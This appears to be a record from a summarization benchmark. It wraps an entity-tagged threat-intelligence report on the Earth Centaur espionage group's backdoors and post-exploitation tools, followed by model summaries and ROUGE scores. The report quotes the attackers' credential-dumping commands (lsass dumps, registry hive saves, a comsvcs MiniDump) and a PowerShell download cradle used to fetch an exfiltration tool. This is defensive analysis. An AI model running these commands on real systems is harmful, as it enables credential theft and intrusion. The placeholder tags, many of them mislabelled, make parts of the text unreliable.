Command code Function0x100010x100020x100030x100040x10005HTShellWrite specified fileDownload FileRead specified fileNo ActionOpen a command shell for command [ORG] executionHTShell is a simple backdoor that is developed using the [ORG] Mongoose framework ( version [CARDINAL] 6.15 ) . Mongoose is an [ORG] Object [ORG] Data [ORG] Modeling ( ODM ) library for MongoDB and [PERSON] Node . Js . It is used to translate between objects in code and objects representation in [CARDINAL] MongoDB.We saw in our cases that the [ORG] HTShell client will be launched as a system service on the compromised machine and that it will connect to a [ORG] C&C server . [ORG] HTShell supports importing additional config files . We found that the additional config file is located in % PUBLIC%\\Documents\\sdcsvc.dat , and that the content should be encoded by base64 . If no config file is imported , it will connect to the predefined [ORG] C&C address.4/16Figure [CARDINAL] 4 . [ORG] HTShell hardcoded C&CsHTShell encodes a hard -coded string , \" tp=== \" with custom base64 and embeds the encoded string in the request cookies . If the [ORG] C&C server receives the request with the special cookie value , it can verify that the request comes from its client applications . Figure [CARDINAL] 5 . [ORG] HTShell hardcoded and encoded cookie string in the request headerThe response handler of [ORG] HTShell will use \u201c ` \u201d as delimiter to split the command code and argument for the received command . Hence , the command will be this format:<command code>`<custom - base64encoded - data>[`<more - custom - base64encoded - data>]HTShell currently supports [CARDINAL] three different backdoor functions , shown here : Command code Function01Open a command shell for command executionUpload [WORK_OF_ART] file5/162Download [WORK_OF_ART] fileCustomized [WORK_OF_ART] Lilith [WORK_OF_ART] RATDuring our investigation into [LOC] Earth [LOC] Centaurs activities , we found that it also uses another backdoor called [PERSON] Lilith RAT . We think that this [PERSON] Lilith RAT is a highly modified version of the open - source [PERSON] Lilith RAT . The actors reused part of the codes for command execution , while the [ORG] C&C protocol is changed to Dropbox HTTPS APIs . Figure [CARDINAL] 6 . Reused codes from open - source [PERSON] Lilith RATIn order to launch this [ORG] RAT , the threat actors use a technique called \" [PRODUCT] Phantom [PRODUCT] DLL hijacking . \" In this technique , the [ORG] RAT will be disguised as the normal [DATE] wlbsctrl.dll . While the Windows service \u201c IKEEXT \u201d is starting , the fake [DATE] wlbsctrl.dll is loaded and executed with high privilege . Furthermore , when [PERSON] Lilith RAT is terminated , it will try to clean itself to prevent being found by investigators . Figure [CARDINAL] 7 . Self - deletion after executionFor the [ORG] C&C connections , the customized [PERSON] Lilith RAT will [ORDINAL] first check in to the attacker \u2019s Dropbox and see if the victim host exists . If not , the hostname and [ORG] IP address will be collected and appended to the existing compromised hosts \u2019 information . All data will then be encrypted and sent back.6/16Figure [CARDINAL] 8 . The [ORDINAL] first check - in request to the [ORG] Dropbox C&CAfter the check - in request , the backdoor will start to wait for more commands to come in . All the request data are formatted to JSON , and they are encrypted by [ORG] AES and encoded by base64.Here is a list of the [ORG] C&C commands : CommandDescriptionCMDCommandExecutes commandsDownloadCloudFile Downloads filesUploadCloudFileUploads filesGetDirGetDirFileLists directoriesLists files in a directory7/16DeleteSelfDeletes [PERSON] itselfSmileSvrWe found that there are [CARDINAL] two types of [ORG] SmileSvr . The difference between the [CARDINAL] two variants is the protocol used for communication : ICMP and SSL . The threat actors will use an installer to install [ORG] SmileSvr as a system service and drop a DAT file that contains encoded [ORG] C&C information . In the configuration file , the memory size used for storing [ORG] C&C address and [ORG] C&C address will be defined . Figure [CARDINAL] 9 . Encrypted configuration fileThe ICMP version of [ORG] SmileSvr will create an [ORG] ICMP socket to connect to the specified [ORG] C&C address , which is defined in a configuration file . In each [ORG] SmileSvr , there is an embedded number ( e.g. , [DATE] 10601 in Figure [CARDINAL] 10 . ) and this value will be used as sequence number in the sent ICMP packet . We think attackers use this value to verify if the incoming packet belongs to their backdoor and filter out the noise . Figure [CARDINAL] 10 . Decrypted configuration fileWithout knowing the real traffic from the [ORG] C&C server , we can only speculate on the content of the response based on the receiving function . As shown in Figure [CARDINAL] 11 , the content of the response should contain the sequence number used to verify if the received data comes from the correct source and [CARDINAL] two blocks of encrypted data . The data decryption procedure is as follows:1 . [ORDINAL] First , the encrypted data is decrypted with a one - byte XOR key ( 0xFF ) . [CARDINAL] 2 . The [ORDINAL] first of the decrypted content contains a magic number used to check data in the [ORDINAL] second block , a command code , and the XOR key to decrypt the [ORDINAL] second set of encrypted content.3 . The [ORDINAL] second set of encrypted content is decrypted with an XOR key ( 0x99 ) from the previousdecrypted content , and within the decrypted data are instructions for the following [DATE] procedures.8/16Figure [DATE] 11 . [ORG] SmileSvr packet traffic format simulationWhile analyzing samples , we found that the [ORG] C&C server was already inactive . Without knowing the traffic between [ORG] SmileSvr and [ORG] C&C server , we could not fully understand all functions . However , most of the backdoor functions are listed here : Command code Function0x50010x50020x50040x50060x50070x50090x500A0x500C0x500EOpens / Reads specified fileUnknownOpens / Writes specified fileOpens command shellUnknownCloses command [PRODUCT] shellFile [PRODUCT] System [PRODUCT] TraversalChecks environment informationUnknownAs for the [ORG] SSL version of [ORG] SmileSvr , the capability of SSL communication is built by using wolfSSL , which is a lightweight , C - language based [ORG] SSL / TLS library . The backdoor functions of [ORG] SSL version [ORG] SmileSvr are similar to the [PERSON] ICMP ones . The threat actors just use it to develop new ways to support data transfer via an encrypted channel . Customized Gh0st [ORG] RAT9/16In our investigation , we also found a suspicious executable named telegram.exe . After analyzing the file , we found that it was a customized version of Gh0st [ORG] RAT . Compared to the original Gh0st [ORG] RAT ( Gh0st beta [CARDINAL] 3.6 ) , the difference is that the customized version supports a new function to discover information from active sessions on the host . All supported functions for the customized Gh0st are shown in the following table : Command code [NORP] Function0xC80xCA0xCB0xCC0XD5Terminates connectionFile manager to handle file operationsScreen monitoringOpens remote shell for command executionGets active session informationPost - ExploitationAfter successfully exploiting the vulnerable system , the threat actor will use multiple hacking tools to discover and compromise machines on the victim \u2019s intranet . In this stage , we also observed attempts to deploy tools to exfiltrate stolen information . During our investigation , we found evidence of specific tools , which we listed in [LAW] Table [LAW] 1 . With these tools , the attackers accomplish their goals ( network discovery , access to the intranet , and exfiltration ) step by step . Tool namePurposeDescriptionSharpHound AD [PRODUCT] Discovery [PRODUCT] Discovery tool to understand the relationship in an AD environmentFRPCChiselIntranet PenetrationIntranet PenetrationFast reverse proxy to help expose a local server behind a [ORG] NAT or firewall to the internetFast TCP / UDP tunnelRCloneExfiltrationA command - line program to sync files and directories to and from different cloud storage providersCredential [ORG] DumpingWe also observed that the group used multiple legitimate tools to dump credentials on compromised machines . It made good use of these tools to achieve its goal and keep its operation hidden and unobstructive . For example , the group uses [ORG] ProcDump.exe ( a tool from [ORG] Windows [ORG] Sysinternals [ORG] Suite that creates dumps of the processes in any scenario ) , which it renamed bootsys.exe:10/16c:\\users\\public\\downloads\\bootsys.exe -accepteula -ma lsass.exeC:\\Users\\Public\\Downloads\\lsass.dmpThe group dumps credentials stored in registries by using reg.exe : reg.exe save [ORG] hklm\\sam C:\\Users\\Public\\Downloads\\sam.hivereg.exe save [ORG] hklm\\sam c:\\windows\\temp\\sa.ditreg.exe save hklm\\security c:\\windows\\temp\\se.ditreg.exe save hklm\\system c:\\windows\\temp\\sy.ditThe group would also dump memory from the specified process by using comsvcs.dll : rundll32.exe [PERSON] C:\\Windows\\System32\\comsvcs.dll [PERSON] MiniDump [CARDINAL] 764 C:\\Windows\\TEMP\\dump.bin fullIndicator [PERSON] RemovalTo avoid exposing their footprints to investigators , the threat actors made their own tool to wipe out the event logs on the victimized machine . By using this tool , they could clean specified event logs and make it hard for investigators to track their operations . The usage is as follows : [PERSON] Intranet [PERSON] PenetrationAfter successfully exploiting the vulnerable system , threat actors also drop following tools : [ORG] FRP and [ORG] Chisel . [ORG] FRP is a fast reverse proxy used to expose a local server behind an [ORG] NAT or a firewall to the internet . It can read predefined configurations and make the host in the intranet available to users from the internet.11/16Figure [CARDINAL] 12 . Configuration for [ORG] FRP fast reverse proxyChisel is a fast TCP / UDP tunnel , which is mainly used for passing through firewalls . It provides the capability to transport data over [ORG] HTTP ( secured via [PERSON] Secure [PERSON] Shell , aka [ORG] SSH ) and allows threat actors to network infrastructure and bypass the firewall . Afterward , we observed a [ORG] PowerShell command used to download an effective tool , [ORG] Rclone , which is used for exfiltration . It also provides an easy and effective way of copying data to several cloud storage providers . C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -command \" $ ( new - objectSystem . Net . WebClient).DownloadFile('url ' r.exe')\"Based on previous experience , Rclone has frequently been used in ransomware attacks to exfiltrate stolen data . However , it seems that currently , it is not only used in ransomware attacks but also in [ORG] APT attacks . Identifying Features in [LOC] the [LOC] Earth [LOC] Centaur Campaign12/16After long - term observation and analysis of the attack campaigns , there was compelling evidence that they were operated by [LOC] Earth [LOC] Centaur . We found several identifying features of the threat actors within the techniques and tools described in the preceding sections , and we break down the factors in the following . [PERSON] Mutex [PERSON] StyleWe found some special mutexes that are encoded by the layout of the [NORP] Chinese Zhuyin keyboard in ChiserClient . The decoded string is shown in [LAW] Table [LAW] 2 . Based on these special mutex strings , we believe the threat actors come from a [LANGUAGE] Chinese - speaking region . Encoded stringDecoded string in [LANGUAGE] Chinese [LANGUAGE] English translationvul3ru,6q8 q8 y.3ji394su3Jack goes aroundI love you5ji fu.6cl3g.3zj6m0694 Excellent table tennis player , Ai FukuharaTable 2 . Encoded / Decoded mutex stringConfiguration styleAfter analyzing the ChiserClient , we found that it shares a similar style of network configuration to the [ORG] TClient mentioned in our previous research on [LOC] Earth [LOC] Centaur . Figure [CARDINAL] 13 . Network configuration ( Left : ChiserClient Right : [PERSON] TClient)Code [PERSON] SimilarityAfter checking the backdoor [ORG] SmileSvr , we found that there was a code similarity between it and [GPE] Troj_YAHAMAM , which was used by [LOC] Earth [LOC] Centaur in an earlier operation . Both share similar codes in configuration decoding , which is shown in Figure [CARDINAL] 14 . Furthermore , the delimiter that was used in13/16SmileSvr to split different values in configuration files is the same as the one used in [GPE] YAHAMAM ( shown as Figure [DATE] 15).Figure [DATE] 14 . Configuration decoding function ( left : [ORG] SmileSvr right : Troj_Yahamam)14/16Figure [CARDINAL] 15 . Function used to split different values in configuration file ( left : [ORG] SmileSvr right : [DATE] Troj_Yahamam)ConclusionThese threat actors are notably sophisticated and well - equipped . Looking deeper into the new methods the group uses , we found that it has an arsenal of tools capable of assessing and then compromising its targets while remaining under the radar . For example , the group can map their target \u2019s network infrastructure and bypass firewalls . It uses backdoors with different protocols , which are deployed depending on the victim . It also has the capability to develop customized tools to evade security monitoring in different environments , and it exploits vulnerable websites and uses them as [ORG] C&C servers . In this blog , we outlined our new findings related to these threat actors to help possible targets in the transportation and other industries . Information on how a threat enters and operates within a victim \u2019s network is invaluable to security teams and can help them create more effective protection for vulnerable organizations . Organizations can also find capable security solutions that can help interpret and respond to malicious activities , techniques , and movements before the threat can culminate and affect an enterprise . [ORG] Trend [ORG] Micro [ORG] Vision [ORG] One \u2122 with [GPE] Managed [GPE] XDR gives security teams a consolidated view into valuable insights so they can organize a more solid line of defense ahead of attacks . For a list of the Indicators of Compromise , please see this document . MITRE ATT&CK MatrixTacticsInitial [PERSON] accessExecutionIDTechniqueT1190Exploit public - facing [ORG] applicationT1059.001 [ORG] Command [ORG] and [ORG] Scripting Interpreter : [ORG] PowerShellT1059.003 [ORG] Command and scripting interpreter : [ORG] Windows [ORG] Command [ORG] Shell15/16T1569.002 [ORG] System [ORG] Services : [ORG] Service ExecutionPersistenceT1543.003 Create or Modify System Process : Windows ServiceDefense evasionT1574.002 Hijack Execution Flow : DLL Side - LoadingT1505.003 Server Software Component : Web ShellT1140T1480Deobfuscate / Decode [PERSON] Files or InformationExecution GuardrailsT1574.002 Hijack Execution Flow : [ORG] DLL Side - LoadingT1070.001 [ORG] Indicator [ORG] Removal on Host : Clear Windows Event LogsT1027.002 Obfuscated Files or Information : Software PackingT1218.011 Signed Binary Proxy Execution : Rundll32T1036.005 Masquerading : [PERSON] Match [PERSON] Legitimate [PERSON] Name or LocationT1197BITS JobsT1070.006 Indicator Removal on Host : TimestompCredential AccessT1003.001 OS Credential Dumping : LSASS MemoryT1552.002 OS Credential Dumping : Credentials in RegistryLateral MovementT1021.002 Remote Services : SMB / Windows Admin SharesDiscoveryT1087.002 Account Discovery : Domain AccountT1482T1083T1005Domain Trust DiscoveryFile and [ORG] Directory [ORG] DiscoveryData from Local SystemCollectionCommand and control [ORG] T1071.001 [ORG] Application layer protocol : web protocolsT1095Non - [ORG] Application layer protocolT1090.001 [PERSON] Proxy : [ORG] Internal [ORG] ProxyExfiltrationT1567.002 [ORG] Exfiltration [ORG] to Cloud Storage16/16", "generated_text": "the report; in the Dark; Tropic Trooper; transportation; government; organizations; transportation companies; government agencies; transportation; documents; data; a packet; the malware; file; Nerapack; second; Protocols; RAT; ChiserClient; SmileSvr; reconnaissance; AD; the group; AD discovery; Protocol Analysis; RAR; Intranet penetration tools; command; control; servers; persistence; the group; tools; the internet.", "ref_text": "<START-1>The PDF describes the cyberespionage activities of an advanced persistent threat (APT) group called Earth Centaur or Tropic Trooper. The group has been active since 2011 targeting transportation companies and government agencies related to transportation. The initial intrusion involves exploiting vulnerabilities like ProxyLogon in Exchange Server to gain access. Web shells are used to install loaders like Nerapack, which retrieves next-stage payloads like the Quasar RAT. Multiple customized backdoors are deployed on compromised systems, communicating over common protocols like ICMP or HTTPS to blend in with normal traffic. Backdoors like ChiserClient, HTShell, Lilith RAT, and SmileSvr support functions like command execution, file operations, and exfiltration. The group uses open-source malware frameworks like Mongoose and WolfSSL to efficiently build new backdoor variants. Evasion techniques include timestomping, encrypted configurations, process injection, and self-deletion. After intruding, the group conducts discovery of Active Directory and internal systems. Tools like SharpHound, FRPC, Chisel, and Rclone are used for lateral movement, tunneling, and exfiltration. Credentials are dumped using built-in Windows utilities. Attribution to Earth Centaur is based on shared code, configurations, and mutex styles with previous campaigns. The group seems to originate from a Chinese-speaking region. Recommendations include reviewing security controls, using multilayered protections, and leveraging threat intelligence to gain insights into malware behaviors and quickly detect intrusions. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.38333333333333336, "gpt3/lexical/rouge_rouge2": 0.11173184357541899, "gpt3/lexical/rouge_rougeL": 0.25, "gpt3/lexical/rouge_rougeLsum": 0.25, "gpt3_generated_text": ["The article discusses the activities of the cyberespionage group Earth Centaur, also known as Tropic Trooper, which has been targeting transportation companies and government agencies related to transportation. The group has been observed attempting to access internal documents and personal information from compromised hosts, although no significant damage has been reported so far. The group is skilled at bypassing security settings and using various backdoors and protocols to maintain its operations undetected. The article provides an overview of the group's infection chain and analyzes their tools and techniques, including loaders, backdoors, and intranet penetration tools. The authors believe that the observed activities are just the beginning and that the group may expand its targets to other industries related to transportation. The article aims to raise awareness and encourage enterprises to review their security settings to protect themselves from potential damage and compromise."]}, {"split_name": "val", "sample_id": "val_57", "prompt_text": "Extract the keywords: A Constant State of FluxTrend Micro 2020 Annual Cybersecurity ReportContents 4 Targeted Attacks [ORG] Focus [ORG] on [ORG] Critical [ORG] Industries and Lucrative Victims15 Covid-19 and [ORG] Remote [ORG] Work [ORG] Cause Major [PERSON] Shifts in [FAC] Cybersecurity23 [FAC] Organizations Face Threats in [GPE] Cloud , IoT , and [GPE] Mobile Environments32 A Greater Number of Dangerous Vulnerabilities Threaten Organizations35 Modern Threats Require Comprehensive Defense Strategies and Multilayered Security Technologies37 Threat Landscape in [ORG] ReviewPublished by [ORG] Trend [ORG] Micro [ORG] ResearchStock image used under license from Shutterstock.comTo say that [DATE] 2020 was a year unlike any other would be understating the impact of the events that occurred throughout [DATE] the [DATE] year . For many organizations , sustaining a [DATE] year - round remote work setup proved to be challenging , not just from a technological standpoint but from a human one as well . And this challenge was only exacerbated by the major security issues and threats that they had to deal with . Targeted ransomware continued to be a major concern in [DATE] 2020 . Older ransomware families such as [ORG] Ryuk sustained their attacks on organizations , while newer ransomware such as [ORG] Egregor and [ORG] DoppelPaymer conducted highly damaging operations in a short span of time . These attacks were often launched on critical industries at the forefront of the fight against the Covid-19 pandemic , such as healthcare , government , and manufacturing . Despite the use of increasingly complex campaigns by threat actor groups , phishing remained a widely used strategy , owing both to its simplicity and to its effectiveness . Social engineering techniques hardly remained static , however , and saw constant , if small , evolutions over [DATE] the [DATE] past [DATE] year . There had been a trend toward the use of supply - chain attacks as cybercriminals aimed to circumvent the security of their targets by indirectly compromising their suppliers and other partners . The attack on the SolarWinds Orion software showed how threat actors could infiltrate even the tightest security measures by finding and exploiting weak spots in the supply chain . The cloud and the internet of things ( [ORG] IoT ) became crucial for the continued operations of many businesses . But their use also exposed organizations \u2014 especially those that had little time to prepare \u2014 to the risks associated with these technologies . Recurring issues such as cloud setting misconfiguration and weak credential management led to security incidents , often involving cryptocurrency miners deployed by malicious actors looking to capitalize on security gaps in the affected systems . There had been a misconception of the cybercriminal underground as a lawless place with few , if any , rules . However , closer inspection revealed a thriving marketplace where products and services , including massive amounts of stolen data , were \u2014 and continue to be \u2014 sold , giving malicious actors easy access to tools and information that would have otherwise been difficult for them to acquire . In this roundup , we take a look back at [DATE] an [DATE] unprecedented [DATE] year of significant changes and upheavals to examine the most important stories , issues , and trends that affected the cybersecurity landscape . With this [DATE] annual cybersecurity report , we hope to equip users and organizations with valuable insights into how they can protect themselves amid a threat landscape in a constant state of flux . Targeted Attacks Focus on Critical Industries and Lucrative Victims Ransomware Operators Maintain Their Sights on Prominent [ORG] TargetsModern ransomware attacks often display characteristics1 that differentiate them from the moreopportunistic ransomware attacks of the past . Instead of using a \u201c shotgun \u201d method , recent ransomwareoperators are more methodical , typically going after the high - value assets of organizations in criticalindustries . Their attacks also display an array of techniques such as exploiting unpatched vulnerabilities , abusing weak remote desktop protocol ( RDP ) security , and using other malware families as part of theroutines . Furthermore , whereas organizations in the past only had to worry about their data being encrypted , ransomware operators have taken things a step further , threatening to prevent organizations fromaccessing their data while also adding the possibility of leaking stolen data \u2014 typically via leak sites \u2014 ifthe victims fail to meet their demands.2Because of the importance of the targets , ransom demands have increased exponentially over the past fewyears . According to the insurance company Coalition , the amount being extorted from its policyholdersdoubled from [DATE] 2019 to [DATE] the [DATE] first [DATE] quarter of 2020 alone.3At the forefront of this ransomware evolution were familiar names such as [ORG] Ryuk and [GPE] Sodinokibi , prominentamong the ransomware families that had largely defined the modern ransomware landscape . [DATE] 2020 alsosaw the rise of relatively new ransomware such as [ORG] Egregor and [ORG] DoppelPaymer , both of which alreadymade their mark , especially during [DATE] the [DATE] second [DATE] half [DATE] of [DATE] the year.4 | A Constant State of Flux : Trend Micro 2020 Annual Cybersecurity ReportWCry 220,166 Locky15,8165,4483,3762,3262,2751,7441,019827526CerberRyukGandCrabSodinokibiCrysisCrypwallEgregorDoppelPaymer0250KFigure [CARDINAL] 1 . Egregor and [ORG] DoppelPaymer both ranked in the top [CARDINAL] 10 despite being relatively new ransomware families : The [CARDINAL] 10 most detected ransomware families in [CARDINAL] 2020Source : [ORG] Trend [ORG] Micro \u2122 [ORG] Smart [ORG] Protection [ORG] Network \u2122 infrastructureDespite [DATE] a [DATE] few [DATE] quiet [DATE] months in [DATE] 2020 , [ORG] Ryuk continued to plague organizations in essential industries . Afterstarting [DATE] the [DATE] year with an attack on the [GPE] US government contractor Electronic [ORG] Warfare [ORG] Associates ( [ORG] EWA ) inFebruary,4 Ryuk kept a relatively low profile from [DATE] May [DATE] to [DATE] September [DATE] before [DATE] ending [DATE] the [DATE] year with a seriesof high - profile campaigns against organizations in the healthcare sector \u2014 even prompting an advisoryfrom the US Cybersecurity and Infrastructure Agency ( CISA ) regarding its activities.5Ryuk has traditionally been known to employ a sizeable range of delivery methods , perhaps the mostcommon being the use of other malware such as [PERSON] Emotet and [PERSON] Trickbot . It has also been observedemploying certain tools that are not necessarily malicious per se but have been known to be exploited formalicious purposes . These include the penetration software [NORP] Cobalt [NORP] Strike6 [NORP] and Metasploit,7 and the post - exploitation framework PowerShell Empire.8 Many of these can actually serve as early warning signs of animpending ransomware attack , if detected in the initial stages . In [DATE] late [DATE] 2020 , [ORG] Ryuk added yet another weapon to its arsenal : a new dropper known as [PRODUCT] BazarLoader ( orBazarBackdoor ) , a loader trojan distributed through phishing emails containing attachments or links tomalicious websites.9 While [ORG] BazarLoader is not particularly noteworthy in and of itself , that operators arecontinuously adding capabilities to [ORG] Ryuk means that vulnerable industries should be particularly wary ofthe ransomware in [DATE] the [DATE] months [DATE] or [DATE] even [DATE] years to come.5 | A Constant State of Flux : Trend Micro 2020 Annual [ORG] Cybersecurity Report2,5002019 22932328114624162531JANFEBMARAPRMAYJUNJULAUGSEPOCTNOVDECFigure 2 . A spike in detections of [ORG] Ryuk occurred in [DATE] October [DATE] 2020 : A comparison of the numbers of detections of [ORG] Ryuk in [DATE] 2019 and [CARDINAL] 2020Source : Trend Micro Smart Protection Network infrastructureAside from [ORG] Ryuk , a number of new families made their presence felt in [DATE] 2020 . Among the more notableransomware families from the [DATE] year \u2019s batch were [GPE] Nefilim and [ORG] ColdLock , which were both discussed in our2020 [DATE] midyear cybersecurity report.10In [DATE] September , Egregor first made an appearance , eventually leading to a string of high - profile attackson major retailers in December.11 Considered a possible spinoff of the [ORG] Sekhmet ransomware becauseof certain shared characteristics,12 [PRODUCT] Egregor has been mentioned as the replacement of choice for theprevious affiliates of the now - retired Maze ransomware.13 [CARDINAL] One interesting characteristic of Egregor is thatit is typically distributed as a payload alongside the remote access trojan ( RAT ) [PERSON] Qakbot , which suggestseither that there is a partnership between the malicious actors behind Egregor and [PERSON] Qakbot or that [PERSON] Egregoris a new payload from the actors behind Qakbot.14The operators of Egregor implement the same double extortion technique used by operators of othermodern ransomware families , whereby an attacker pressures the victim into paying the ransom bythreatening the release of stolen information through a leak site . Facing a [CARDINAL] two - pronged predicament \u2014 public exposure as well as loss of data \u2014 the victim would be compelled to yield to the attacker \u2019s demand.6 | A Constant State of Flux : Trend Micro 2020 Annual [ORG] Cybersecurity ReportAn unknown component executes a batch \ufb01le withThe batch \ufb01le downloads and executes the Egregorarguments.binary . Egregor is executed withspeci\ufb01c arguments to properly run and encrypt\ufb01les . The ransomware payloadis deployed . Figure [CARDINAL] 3 . The attack chain of the Egregor ransomwareAnother prominent ransomware that made waves in [DATE] 2020 was [CARDINAL] DoppelPaymer.15 Although not a newransomware family \u2014 it had been active since [DATE] 2019 \u2014 [ORG] DoppelPaymer surged in activity in [DATE] late [DATE] 2020 tothe extent that [ORG] the [ORG] US [ORG] Federal [ORG] Bureau [ORG] of [ORG] Investigation ( [ORG] FBI ) was forced to release an advisory warningorganizations about its attacks.16DoppelPaymer is believed to be based on [ORG] BitPaymer , an older ransomware family that targets medicalorganizations,17 as they share similarities in code , ransom notes , and payment portals . [ORG] DoppelPaymeremploys advanced techniques such as requiring the correct command - line parameter in order to run(possibly implemented to avoid detection and analysis ) . It also uses various tools such as [ORG] Process [ORG] Hacker , which terminates services and processes to prevent access violation during the encryption routine.18As with other cases of targeted ransomware , [ORG] DoppelPaymer \u2019s primary targets are organizations in criticalindustries such as healthcare , emergency services , and education . EmotetDridex\u2022 Possibly arrives viamalicious spam\u2022 Downloads Dridex\u2022 Downloadstools / ransomware\u2022 [ORG] Opens up affected system for incoming connectionsPowerShell Empire / Cobalt Strike / Mimikatz / PSExec\u2022 Performs lateral movement\u2022 Disables antivirus software\u2022 Executes DoppelPaymerwith the correct parametersDoppelPaymer\u2022 Performs encryption\u2022 Locks users out of thesystem by changing their passwords\u2022 Uses Process Hacker to terminate services and processesFigure 4 . The infection routine of the [ORG] DoppelPaymer ransomwareAs we can observe from these and other campaigns , ransomware operators ramped up attacks on criticalindustries such as government and healthcare , perhaps because of how important they were in dealingwith the Covid-19 pandemic . The manufacturing industry also became a prime target for ransomwareoperators.19 A ransomware attack on a manufacturing facility could have grave consequences for the victimorganization , such as disruptions in business and supply chain operations , delays in product engineeringand design , and even data theft . Banking was another frequently targeted industry , presumably becauseof the size and wealth of the companies involved in the field.7 | A Constant State of Flux : Trend Micro 2020 Annual [ORG] Cybersecurity Report31,90622,08217,07115,7014,9174,5784,2163,7022,2812,002GovernmentBankingManufacturingHeathcareFinanceEducationTechnologyFood and [ORG] beverageOil and gasInsurance035KFigure [CARDINAL] 5 . Government , banking , manufacturing , and healthcare were the industries hit hardest by ransomwareattacks : The [CARDINAL] 10 industries most targeted by ransomware attacks in [CARDINAL] 2020Source : [ORG] Trend [ORG] Micro [ORG] Smart [ORG] Protection [ORG] Network infrastructureRansomware operators have also been expanding their target range to other operating systems . Forinstance , although [ORG] RansomExx does not appear in the list of the [CARDINAL] 10 most detected ransomware families in2020 , it was still notable for having a variant that was used to attack Linux servers . Based on our analysis , [ORG] RansomExx \u2019s main target is the general [ORG] VMware environment , that is , machines that are used for storingVMware files.20Campaigns [LOC] Take [LOC] Aim [LOC] at [LOC] Specific [LOC] Demographics [LOC] Using Sophisticated Tools and [NORP] TechniquesIn addition to targeted ransomware attacks , we observed a number of campaigns from both veteranthreat actors and newer groups . Many of these campaigns exhibited complicated structures and processes , indicating that although thecampaigns seemed to be fairly new , the people behind it were not . In [DATE] October , we published a researchpaper on a campaign we called [PERSON] Earth [PERSON] Kitsune , which involved threat actors compromising [GPE] North [GPE] Korea - related websites and using them to host malware.218 | A Constant State of Flux : Trend Micro 2020 Annual Cybersecurity Report1The victim accesses a watering hole website.2The exploit runs , followed by the malware loader . Watering holewebsite injected withCVE-2020 - 0674PowerShellloaderSlubSlub [ORG] C&C serverMattermostVictimdneSpyC&C serverWatering holewebsite injected withCVE-2019 - 5782ShellcodeloaderFigure 6 . The infection chain used by [LAW] the [LAW] Earth [LAW] Kitsune campaignagfSpyC&C serverEarth Kitsune employed [CARDINAL] two vulnerabilities , the Google Chrome vulnerability CVE-2019 - 5782 and theInternet Explorer vulnerability CVE-2020 - 0674 , to compromise the target websites . It also used a trio ofbackdoors : Slub for exfiltrating information , and agfSpy and dneSpy for gaining additional control overan affected user \u2019s machine . Our follow - up research on [GPE] Earth [GPE] Kitsune22 painted a picture of a complex and expansive campaign thatcombined a large infrastructure with a wide array of tools and exploits . In other words , the campaign wascarried out not by mere amateurs but by a group of experienced and skilled actors who had their eyes seton a very specific demographic . We also tracked a campaign called [LOC] Earth [LOC] Wendigo,23 which had very similar themes and motives . [PERSON] LikeEarth [PERSON] Kitsune , this campaign targeted a particular group of people : in its case , individuals with an interestin issues concerning [GPE] Tibet , the [GPE] Uighur region , and [GPE] Hong [GPE] Kong . The goal of the threat actor behind thiscampaign was to obtain information via exfiltrated mailboxes . [PERSON] Earth [PERSON] Wendigo gains initial access to a system via spear - phishing emails that contain obfuscatedJavaScript code , which then loads malicious scripts from a remote server . The scripts are designed fora variety of functions , including infection of the target via [CARDINAL] two methods . The [ORDINAL] first method involves theexploitation of a cross - site scripting ( [ORG] XSS ) vulnerability on the webmail system , while the [ORDINAL] second involvesthe registration of malicious [ORG] JavaScript code to a web browser feature known as [PERSON] Service [PERSON] Worker . Forlateral movement , the campaign uses malicious code injection to modify the victim \u2019s email signature.9 | A Constant State of Flux : Trend Micro 2020 Annual Cybersecurity Report1The attacker sendsa spear - phishing email to the target organization . [PERSON] Webmail serverVictim2The victim opens the email , triggering an [GPE] XSS attack designed to infect the victim \u2019s mail accountand [PERSON] Service [PERSON] Worker . Other victims3The [GPE] XSS attack propagatesacross the organizationvia poisoned emailsignatures . Attacker6The attacker receives thevictim \u2019s mailbox and credentials . [GPE] XSS script [GPE] server5The stolen logincredentials and sessionkeys are sent to the [ORG] XSS script server . The victim \u2019s mailbox isex\ufb01ltrated by the JavaScript backdoor delivered from theWebSocket server.4WebSocketex\ufb01ltration serverFigure [CARDINAL] 7 . The attack flow used in [LOC] the [LOC] Earth [LOC] Wendigo campaignAside from these campaigns from newer groups , we also tracked the activities of [ORG] SideWinder , a group thatprimarily operates in the [NORP] South [NORP] Asian region . The group was particularly active in [DATE] 2020 , launching spear - phishing attacks that had Covid-19 - related themes or discussed territorial disputes and other diplomaticissues between [NORP] South [NORP] Asian countries and China.24 Apparently , [ORG] SideWinder \u2019s primary social engineeringtechnique was the use of current events in luring its victims into visiting its phishing pages . To accommodate the increasing complexity of their campaigns , malicious actors have had to look beyondtheir repertoire and employ external tools and services for their activities . As discussed in a research paperwe published [DATE] last [DATE] year , the access - as - a - service model , which involves underground sellers providingaccess to hacked devices and enterprise networks , has become popular with cybercriminals lookingto gain a foothold into their targets \u2019 systems . The levels of access being sold vary , from simple accountcredentials and RDP access to full network access in some cases.25 Notable users of this model includethe operators of [ORG] Ryuk , who have been observed using [ORDINAL] third - party malware such as [ORG] Trickbot to gainaccess to infected networks.26Threat Actors Employ Basic but Effective TechniquesWhile we saw campaigns from highly skilled groups such as the ones that created [PERSON] Earth [PERSON] Kitsune and [ORG] EarthWendigo , we also found other threat actors relying on less complex methods in their operations . The Pawn Storm group had been active since it [ORDINAL] first emerged in [DATE] 2004 , when it launched a number ofattacks on groups and individuals involved in high - profile [PERSON] industries.27 But in [DATE] 2020 , instead of going forthe more complex strategies employed by other threat groups , [PERSON] Pawn [PERSON] Storm seemingly opted for moremundane fare in some of its campaigns . It used fairly basic techniques such as brute - force attacks on10 | A Constant State of Flux : Trend Micro 2020 Annual Cybersecurity Reportinternet - facing services and common tools such as RATs.28 In fact , had it not been for our experience andknowledge with the tools and techniques used by [PERSON] Pawn [PERSON] Storm , it would have been difficult to attributethese campaigns to the group based purely on analyzed samples . Indeed , just because a technique is simple does not mean that it is inherently less successful than asophisticated one . A strong testament to this is phishing , which remains highly effective despite being oneof the oldest tricks in the book . At its core , phishing is a very simple technique . An attacker does not needto have technical skills or knowledge to perform phishing ; all that is needed is an innate understanding ofhuman psychology and some form of social engineering designed to exploit it . However , phishing techniques do not remain static . In fact , they are also constantly evolving . An exampleof this evolution is a trend we observed in [DATE] 2020 : the use of form builder services , such as those used tocreate surveys , to host phishing sites.29One of the primary appeals of form builders is that , unlike fake domains and website builders , they 